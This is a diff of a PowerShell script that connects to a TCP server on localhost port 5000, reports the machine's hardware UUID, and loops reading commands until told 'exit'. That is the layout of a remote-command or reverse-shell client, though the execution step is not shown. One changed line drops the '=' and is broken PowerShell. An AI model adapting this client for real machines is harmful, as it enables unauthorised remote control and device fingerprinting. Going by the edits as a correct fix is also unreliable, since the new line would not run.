@@ -1,5 +1,5 @@
 # Attempt to establish connection to server.
-$client = New-Object System.Net.Sockets.TCPClient "localhost", 5000;
+$client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
 if ($client -eq $null) {
     exit 1;
 }
@@ -9,16 +9,16 @@ $stream = $client.GetStream();
 
 # Get unique identifier for the machine.
 try {
-    $uuid = (Get-WMIObject Win32_ComputerSystemProduct).UUID;
+    $uuid [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
 } catch [System.Management.Automation.CommandNotFoundException] {
-    $uuid = 0xFF;
+    $uuid = 0;
 }
 
 # Send UUID to server.
 $stream.Write($uuid, 0, $uuid.Length);
 $stream.Flush();
 
-# Pre-initialize byte array with zeroes?. Max command length 65535 bytes?
+# Preallocate byte array with zeroes? Max command length 65535 bytes?
 [byte[]] $bytes = 0..65535 |% {0};
 
 # Loop indefinitely until "exit" command is issued.
